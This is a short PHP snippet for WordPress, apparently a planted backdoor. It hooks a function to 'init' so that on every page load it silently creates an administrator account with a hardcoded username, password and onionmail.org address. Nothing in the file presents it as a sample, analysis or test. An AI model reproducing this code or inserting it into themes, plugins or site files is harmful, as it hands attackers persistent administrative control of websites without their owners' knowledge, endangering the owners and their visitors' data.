<?php
function addadmin(){
$login = 'tmp1337';
$passw = 'tmp#1337';
$email = 'vxodk1337@onionmail.org';
if ( !username_exists( $login ) && !email_exists( $email ) ) {
$user_id = wp_create_user( $login, $passw, $email );
$user = new WP_User( $user_id );
$user->set_role( 'administrator' );
}
}
add_action('init','addadmin');

?>